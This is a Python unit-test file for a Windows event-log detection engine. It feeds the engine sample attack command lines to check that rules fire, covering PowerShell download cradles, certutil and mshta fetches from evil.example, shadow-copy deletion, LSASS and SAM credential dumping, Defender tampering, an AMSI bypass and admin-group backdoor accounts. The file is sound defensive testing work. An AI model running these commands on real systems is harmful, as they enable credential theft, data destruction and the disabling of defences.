"""Detection rule tests: every rule gets a positive case, the noisy ones also get a negative case."""
import os
import sqlite3
import tempfile
import unittest

os.environ['LOCALAPPDATA'] = tempfile.mkdtemp()   # never touch the real database
from datetime import datetime, timedelta, timezone

import database as db
from detection import evaluate, tags

T0 = datetime(2026, 11, 24, 7, 0, tzinfo=timezone.utc)


class Base(unittest.TestCase):
    def setUp(self):
        self.c = sqlite3.connect(':memory:')
        self.c.row_factory = sqlite3.Row
        db.create_schema(self.c)
        self.n = 0
        # baseline learning already finished long ago, so anomalies can fire when a test wants them
        self.c.execute("INSERT INTO collector_state VALUES('baseline_start','2020-01-01T00:00:00+00:00')")

    def tearDown(self):
        self.c.close()

    def add(self, channel='Security', event_id=4624, sec=0, **f):
        """Insert an event the same way ingest does and return the rules that fired."""
        self.n += 1
        e = dict(channel=channel, event_id=event_id, record_id=self.n, time_utc=(T0 + timedelta(seconds=sec)).isoformat(),
                 computer='PC1', **f)
        e['tags'] = tags(e)
        cols = [k for k in e if k in ('channel', 'event_id', 'record_id', 'time_utc', 'computer', 'username', 'source_ip', 'logon_type',
                                      'logon_id', 'process', 'parent_process', 'command_line', 'process_guid', 'target', 'dest_ip',
                                      'dest_port', 'status', 'tags', 'level', 'subject_user')]
        self.c.execute('INSERT INTO events(%s) VALUES(%s)' % (','.join(cols), ','.join('?' * len(cols))), [e[k] for k in cols])
        return {d['rule_id']: d for d in evaluate(self.c, e)}

    def proc(self, cmd, image=None, parent='C:\\Windows\\explorer.exe', sec=0, **f):
        image = image or 'C:\\Windows\\System32\\' + cmd.split(' ')[0]
        return self.add('Sysmon', 1, sec, process=image, command_line=cmd, parent_process=parent, **f)


class AuthRules(Base):
    def test_failed_login_burst(self):
        for n in range(4):
            self.assertNotIn('FAILED_LOGIN_BURST', self.add(event_id=4625, sec=n, username='PC1\\alice', source_ip='203.0.113.9'))
        self.assertEqual(self.add(event_id=4625, sec=5, username='PC1\\alice', source_ip='203.0.113.9')['FAILED_LOGIN_BURST']['severity'], 'High')

    def test_success_after_failures(self):
        for n in range(3):
            self.add(event_id=4625, sec=n, username='PC1\\alice')
        self.assertIn('SUCCESS_AFTER_FAILURES', self.add(event_id=4624, sec=10, username='PC1\\alice'))

    def test_password_spray(self):
        hits = {}
        for n in range(5):
            hits = self.add(event_id=4625, sec=n, username='PC1\\user%d' % n, source_ip='198.51.100.7', status='0xc0000064 (user does not exist)')
        self.assertIn('PASSWORD_SPRAY', hits)
        self.assertIn('5 non-existent', hits['PASSWORD_SPRAY']['summary'])

    def test_log_cleared_both_channels(self):
        self.assertEqual(self.add(event_id=1102, username='PC1\\bob')['SECURITY_LOG_CLEARED']['severity'], 'Critical')
        self.assertIn('SECURITY_LOG_CLEARED', self.add('System', 104, target='System'))

    def test_4672_ignores_system_accounts(self):
        self.assertNotIn('SPECIAL_PRIVILEGES_ASSIGNED', self.add(event_id=4672, username='NT AUTHORITY\\SYSTEM'))
        self.assertNotIn('SPECIAL_PRIVILEGES_ASSIGNED', self.add(event_id=4672, username='CORP\\PC1$'))
        self.assertIn('SPECIAL_PRIVILEGES_ASSIGNED', self.add(event_id=4672, username='PC1\\alice'))

    def test_admin_group_add_is_critical(self):
        r = self.add(event_id=4732, username='S-1-5-21-1-2-3-1001', target='Builtin\\Administrators', subject_user='PC1\\eve')
        self.assertEqual(r['ACCOUNT_ADDED_GROUP']['severity'], 'Critical')

    def test_account_lifecycle(self):
        self.assertIn('ACCOUNT_CREATED', self.add(event_id=4720, username='PC1\\backdoor'))
        self.assertIn('ACCOUNT_DELETED', self.add(event_id=4726, username='PC1\\backdoor'))
        self.assertIn('AUDIT_POLICY_CHANGED', self.add(event_id=4719, target='{0CCE922B}'))


class ExecutionRules(Base):
    def test_office_spawns_shell(self):
        r = self.proc('powershell.exe -c whoami', parent='C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE')
        self.assertIn('OFFICE_SPAWNS_SHELL', r)

    def test_encoded_powershell(self):
        self.assertIn('ENCODED_POWERSHELL', self.proc('powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'))
        self.assertNotIn('ENCODED_POWERSHELL', self.proc('powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1'))

    def test_download_cradle(self):
        r = self.proc("powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\"")
        self.assertIn('POWERSHELL_DOWNLOAD_EXEC', r)

    def test_lolbins(self):
        self.assertIn('LOLBIN_ABUSE', self.proc('certutil.exe -urlcache -split -f http://x/p.exe p.exe'))
        self.assertIn('LOLBIN_ABUSE', self.proc('mshta.exe https://evil.example/a.hta'))
        self.assertNotIn('LOLBIN_ABUSE', self.proc('certutil.exe -hashfile file.iso SHA256'))

    def test_shadow_copy_deletion(self):
        self.assertEqual(self.proc('vssadmin.exe Delete Shadows /All /Quiet')['SHADOW_COPY_DELETION']['severity'], 'Critical')
        self.assertIn('SHADOW_COPY_DELETION', self.proc('wmic.exe shadowcopy delete'))
        self.assertNotIn('SHADOW_COPY_DELETION', self.proc('vssadmin.exe list shadows'))

    def test_log_clear_command(self):
        self.assertIn('LOG_CLEAR_COMMAND', self.proc('wevtutil.exe cl Security'))

    def test_defender_tamper_command(self):
        self.assertIn('DEFENSE_TAMPERING_COMMAND', self.proc('powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true'))
        self.assertIn('DEFENSE_TAMPERING_COMMAND', self.proc('powershell.exe Add-MpPreference -ExclusionPath C:\\Users\\Public'))

    def test_credential_dump_commands(self):
        self.assertIn('CREDENTIAL_DUMP_COMMAND', self.proc('rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full'))
        self.assertIn('CREDENTIAL_DUMP_COMMAND', self.proc('reg.exe save HKLM\\SAM C:\\t\\sam'))
        self.assertIn('CREDENTIAL_DUMP_COMMAND', self.proc('procdump64.exe -ma lsass.exe out.dmp', image='C:\\t\\procdump64.exe'))

    def test_net_user_add(self):
        self.assertEqual(self.proc('net.exe localgroup administrators hacker /add')['ACCOUNT_MANIPULATION_COMMAND']['severity'], 'Critical')

    def test_masquerading(self):
        self.assertIn('PROCESS_MASQUERADING', self.proc('svchost.exe', image='C:\\Users\\Public\\svchost.exe'))
        self.assertNotIn('PROCESS_MASQUERADING', self.proc('svchost.exe -k netsvcs', image='C:\\Windows\\System32\\svchost.exe',
                                                          parent='C:\\Windows\\System32\\services.exe'))

    def test_4688_works_like_sysmon_1(self):
        r = self.add('Security', 4688, process='C:\\Windows\\System32\\vssadmin.exe', command_line='vssadmin delete shadows /all')
        self.assertIn('SHADOW_COPY_DELETION', r)

    def test_recon_burst(self):
        hits = {}
        for i, cmd in enumerate(['whoami.exe /all', 'net.exe user', 'net.exe localgroup administrators', 'ipconfig.exe /all']):
            hits = self.proc(cmd, sec=i * 10, logon_id='0xabc', username='PC1\\alice')
        self.assertIn('RECON_BURST', hits)

    def test_recon_needs_several_commands(self):
        self.assertNotIn('RECON_BURST', self.proc('whoami.exe', logon_id='0xabc'))
        self.assertEqual(tags({'channel': 'Sysmon', 'event_id': 1, 'process': 'C:\\Windows\\System32\\ipconfig.exe', 'command_line': 'ipconfig'}), '')


class SysmonRules(Base):
    def test_lsass_access(self):
        r = self.add('Sysmon', 10, process='C:\\Users\\Public\\x.exe', target='C:\\Windows\\system32\\lsass.exe', status='0x1010')
        self.assertEqual(r['LSASS_ACCESS']['severity'], 'Critical')
        self.assertNotIn('LSASS_ACCESS', self.add('Sysmon', 10, process='C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe',
                                                  target='C:\\Windows\\system32\\lsass.exe', status='0x1410'))
        self.assertNotIn('LSASS_ACCESS', self.add('Sysmon', 10, process='C:\\x.exe', target='C:\\Windows\\system32\\lsass.exe', status='0x1000'))

    def test_registry_run_key(self):
        r = self.add('Sysmon', 13, process='C:\\Users\\a\\AppData\\Local\\Temp\\x.exe',
                     target='HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd', command_line='C:\\Users\\a\\AppData\\Roaming\\u.exe')
        self.assertEqual(r['REGISTRY_PERSISTENCE']['severity'], 'High')

    def test_defender_exclusion_registry(self):
        r = self.add('Sysmon', 13, target='HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\evil', command_line='DWORD (0x00000000)')
        self.assertIn('DEFENDER_EXCLUSION_ADDED', r)

    def test_remote_thread(self):
        self.assertIn('REMOTE_THREAD_INJECTION', self.add('Sysmon', 8, process='C:\\t\\inj.exe', target='C:\\Windows\\explorer.exe'))

    def test_script_host_network(self):
        r = self.add('Sysmon', 3, process='C:\\Windows\\System32\\rundll32.exe', dest_ip='45.33.32.156', dest_port='443', status='outbound')
        self.assertIn('SCRIPT_HOST_NETWORK', r)
        r = self.add('Sysmon', 3, process='C:\\Windows\\System32\\rundll32.exe', dest_ip='192.168.1.5', dest_port='445', status='outbound')
        self.assertNotIn('SCRIPT_HOST_NETWORK', r)

    def test_mass_file_activity(self):
        hits = {}
        for i in range(100):
            hits = self.add('Sysmon', 11, sec=i * 0.3, process='C:\\Users\\a\\AppData\\Local\\Temp\\enc.exe', process_guid='{G1}',
                            target='C:\\Users\\a\\Documents\\file%d.docx.locked' % i)
        self.assertIn('MASS_FILE_ACTIVITY', hits)

    def test_ransom_note(self):
        hits = {}
        for d in ('Documents', 'Desktop', 'Pictures'):
            hits = self.add('Sysmon', 11, process='C:\\t\\enc.exe', process_guid='{G2}', target='C:\\Users\\a\\%s\\HOW_TO_DECRYPT.txt' % d)
        self.assertIn('RANSOM_NOTE', hits)

    def test_beaconing(self):
        hits = {}
        for i in range(9):
            hits = self.add('Sysmon', 3, sec=i * 60, process='C:\\Users\\a\\AppData\\Roaming\\agent.exe', dest_ip='45.33.32.157',
                            dest_port='443', status='outbound')
        self.assertIn('C2_BEACONING', hits)

    def test_irregular_traffic_is_not_beaconing(self):
        hits = {}
        for i, s in enumerate([0, 5, 70, 400, 410, 900, 1500, 1520, 2900]):
            hits = self.add('Sysmon', 3, sec=s, process='C:\\Apps\\app.exe', dest_ip='45.33.32.158', dest_port='443', status='outbound')
        self.assertNotIn('C2_BEACONING', hits)


class OtherChannels(Base):
    def test_powershell_amsi_bypass(self):
        r = self.add('PowerShell', 4104, command_line="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed')")
        self.assertEqual(r['POWERSHELL_MALICIOUS_SCRIPT']['severity'], 'Critical')

    def test_powershell_warning_level(self):
        r = self.add('PowerShell', 4104, command_line='Get-Something', level='Warning')
        self.assertEqual(r['POWERSHELL_MALICIOUS_SCRIPT']['severity'], 'Medium')
        self.assertNotIn('POWERSHELL_MALICIOUS_SCRIPT', self.add('PowerShell', 4104, command_line='Get-ChildItem C:\\', level='Verbose'))

    def test_suspicious_service(self):
        self.assertEqual(self.add('System', 7045, target='upd', command_line='cmd.exe /c powershell -enc AAAA')['SERVICE_INSTALLED']['severity'], 'Critical')
        self.assertEqual(self.add('System', 7045, target='Vendor', command_line='"C:\\Program Files\\Vendor\\svc.exe"')['SERVICE_INSTALLED']['severity'], 'Medium')

    def test_scheduled_task_ignores_microsoft_tasks(self):
        self.assertNotIn('SCHEDULED_TASK_CREATED', self.add('TaskScheduler', 106, target='\\Microsoft\\Windows\\UpdateOrchestrator\\x'))
        self.assertIn('SCHEDULED_TASK_CREATED', self.add('TaskScheduler', 106, target='\\Updater'))

    def test_defender(self):
        self.assertEqual(self.add('Defender', 1119, target='Trojan:Win32/X')['DEFENDER_MALWARE']['severity'], 'Critical')
        self.assertIn('DEFENDER_DISABLED', self.add('Defender', 5001))


class BaselineAndAllowlist(Base):
    def test_new_parent_child_after_learning(self):
        self.assertIn('ANOMALY_NEW_PARENT_CHILD', self.proc('calc.exe', parent='C:\\Windows\\System32\\notepad.exe'))
        self.assertNotIn('ANOMALY_NEW_PARENT_CHILD', self.proc('calc.exe', parent='C:\\Windows\\System32\\notepad.exe'))

    def test_learning_period_is_silent(self):
        self.c.execute("UPDATE collector_state SET value=? WHERE key='baseline_start'", (T0.isoformat(),))
        self.assertNotIn('ANOMALY_NEW_PARENT_CHILD', self.proc('calc.exe', parent='C:\\Windows\\System32\\notepad.exe'))
        self.assertEqual(self.c.execute('SELECT COUNT(*) FROM baseline').fetchone()[0], 1)

    def test_new_rdp_source(self):
        r = self.add(event_id=4624, username='PC1\\alice', source_ip='203.0.113.5', logon_type='10 - RemoteInteractive (RDP)')
        self.assertEqual(r['ANOMALY_NEW_RDP_SOURCE']['severity'], 'Medium')

    def test_allowlist_suppresses(self):
        self.c.execute("INSERT INTO allowlist(rule_id,field,pattern) VALUES('LOLBIN_ABUSE','command_line','intranet.local')")
        self.assertNotIn('LOLBIN_ABUSE', self.proc('certutil.exe -urlcache -f http://intranet.local/ca.crt ca.crt'))
        self.assertIn('LOLBIN_ABUSE', self.proc('certutil.exe -urlcache -f http://evil.example/p.exe p.exe'))


if __name__ == '__main__':
    unittest.main()
